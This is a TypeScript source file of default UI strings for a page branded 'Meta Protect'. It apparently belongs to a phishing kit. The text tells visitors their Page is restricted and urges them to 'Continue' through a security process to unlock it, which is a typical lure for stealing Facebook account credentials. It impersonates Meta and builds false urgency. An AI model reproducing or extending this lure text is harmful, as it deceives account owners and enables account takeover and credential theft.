export interface IndexTranslatedTexts {
    title: string;
    description: string;
    protectionText: string;
    processText: string;
    continueBtn: string;
    restrictedText: string;
}

export const defaultIndexTexts: IndexTranslatedTexts = {
    title: 'Welcome To Meta Protect.',
    description: "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
    protectionText: "We've enabled advanced protections to unlock your Page.",
    processText: 'Below, we walk you through the process in detail and help you fully activate to unlock your Page.',
    continueBtn: 'Continue',
    restrictedText: 'Your page was restricted on'
};
